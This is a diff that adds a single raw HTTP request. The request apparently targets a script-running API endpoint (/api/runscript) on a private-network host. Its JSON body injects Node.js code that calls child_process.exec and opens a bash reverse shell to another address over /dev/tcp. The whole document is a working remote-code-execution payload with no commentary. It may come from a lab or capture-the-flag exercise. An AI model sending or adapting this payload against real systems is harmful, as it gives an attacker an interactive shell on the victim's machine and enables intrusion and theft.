@@ -1,0 +1,35 @@
+POST /api/runscript HTTP/1.1
+Host: 192.168.214.35:1881
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: io=ZcM_hy0hLfs_n-MVAAAB
+Upgrade-Insecure-Requests: 1
+Content-Length: 473
+Content-Type: application/json
+
+{
+  "headers": {
+    "normalizedNames": {},
+    "lazyUpdate": "null"
+  },
+  "params": {
+    "script": {
+      "parameters": [
+        {
+          "name": "ok",
+          "type": "tagid",
+          "value": ""
+        }
+      ],
+      "mode": "",
+      "id": "",
+      "test": "true",
+      "name": "ok",
+      "outputId": "",
+      "code": "require('child_process').exec('/bin/bash -c \"/bin/sh -i >& /dev/tcp/192.168.45.232/1881 0>&1\"')"
+    }
+  }
+}
